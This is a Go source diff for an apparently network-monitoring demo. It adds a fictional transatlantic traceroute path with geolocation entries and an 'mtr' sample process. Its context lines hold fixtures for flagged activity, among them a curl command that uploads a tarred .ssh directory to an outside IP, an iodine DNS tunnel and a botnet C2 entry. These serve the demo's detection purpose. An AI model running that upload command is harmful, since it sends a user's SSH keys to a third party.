@@ -147,6 +147,24 @@ var (
 	badIntel = svc("cdn-update.example", "192.0.2.13", 443, false, auckland, 64500, "Feodo-listed botnet C2 (demo)")
 )
 
+// The routers on the demo's transatlantic traceroute (benchmarking
+// address space, fictional names).
+var tracePath = []struct {
+	ip  netip.Addr
+	at  place
+	rtt float64 // ms from home
+}{
+	{router, frankfurt, 1.1},
+	{netip.MustParseAddr("198.18.1.1"), frankfurt, 3.8},
+	{netip.MustParseAddr("198.18.2.1"), frankfurt, 4.6},
+	{netip.MustParseAddr("198.18.3.1"), amsterdam, 9.2},
+	{netip.MustParseAddr("198.18.4.1"), london, 14.1},
+	{netip.MustParseAddr("198.18.5.1"), place{"New York", "New York", "US", "United States", 40.7128, -74.0060}, 81.5},
+	{netip.MustParseAddr("198.18.6.1"), place{"Chicago", "Illinois", "US", "United States", 41.8781, -87.6298}, 98.7},
+	{netip.MustParseAddr("198.18.7.1"), place{"San Jose", "California", "US", "United States", 37.3382, -121.8863}, 144.9},
+	{anthropic.ip, sanFrancisco, 148.3},
+}
+
 func mountainView() place {
 	return place{"Mountain View", "California", "US", "United States", 37.3861, -122.0839}
 }
@@ -182,6 +200,10 @@ func NewLocator() *Locator {
 			HasCoord: true, Lat: s.at.lat, Lon: s.at.lon, City: s.at.city, Region: s.at.region,
 			CC: s.at.cc, Country: s.at.country, ASN: s.asn, Org: s.org,
 		}
+	}
+	for _, hop := range tracePath[1 : len(tracePath)-1] {
+		l.by[hop.ip] = geo.Location{HasCoord: true, Lat: hop.at.lat, Lon: hop.at.lon, City: hop.at.city,
+			Region: hop.at.region, CC: hop.at.cc, Country: hop.at.country, ASN: 64510, Org: "Example Transit (demo)"}
 	}
 	return l
 }
@@ -226,4 +248,5 @@ var (
 	pCurl   = proc(9999, "curl", "/usr/bin/curl", "curl -sk -T /home/demo/.ssh.tar.gz https://198.51.100.23/u", "demo", "")
 	pTor    = proc(9050, "tor", "/usr/bin/tor", "/usr/bin/tor -f /etc/tor/torrc", "tor", "tor.service")
 	pDNSTun = proc(4444, "iodine", "/usr/bin/iodine", "iodine -f t.example.com", "demo", "")
+	pMTR    = proc(5555, "mtr", "/usr/bin/mtr", "mtr api.anthropic.com", "demo", "kitty-8004-0.scope")
 )
